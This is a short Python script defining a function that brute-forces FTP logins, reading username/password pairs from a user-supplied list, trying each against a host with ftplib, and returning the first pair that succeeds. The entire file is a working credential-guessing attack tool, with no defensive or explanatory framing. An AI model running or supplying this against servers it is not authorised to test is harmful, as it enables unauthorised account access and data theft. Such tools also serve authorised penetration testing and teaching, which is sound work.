import ftplib


def ftp_bruteforce(host):
    filepath = input('Enter the absolute path of a username/password list: ')
    try:
        file = open(filepath, 'r')
    except Exception:
        print('[!!] File does not exist!')

    for line in file.readlines():
        username = line.split('/')[0]
        password = line.split('/')[1].strip('\n')
        print('[+] Trying: ' + username + '/' + password)
        try:
            ftp = ftplib.FTP(host)
            login = ftp.login(username, password)
            print('[+] Login succeeded with: ' + username + '/' + password)
            ftp.quit()
            return username, password
        except Exception:
            pass
    print('[-] Password not in list')
